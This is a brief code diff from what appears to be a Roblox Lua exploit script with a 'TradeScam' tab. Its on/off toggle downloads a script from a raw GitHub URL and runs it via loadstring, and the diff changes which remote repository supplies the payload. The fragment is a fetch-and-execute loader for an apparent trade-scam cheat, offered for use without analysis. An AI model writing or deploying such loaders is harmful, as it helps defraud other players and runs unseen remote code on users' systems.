@@ -8,7 +8,7 @@ local Section = Tab:NewSection("🎁 TradeScam TAB")
 Section:NewToggle("\226\156\133 On / \226\157\140 Off", "", function(state)
     if state then
 	lib.Message.New("\226\156\133 Script on.")
-  loadstring(game:HttpGet("https://raw.githubusercontent.com/Dofikalty/Exploite/main/xxxx"))()
+  loadstring(game:HttpGet("https://raw.githubusercontent.com/n3koglaii/katana/main/ira"))()
     else
     lib.Message.New("\226\157\140 Script off.")
     end
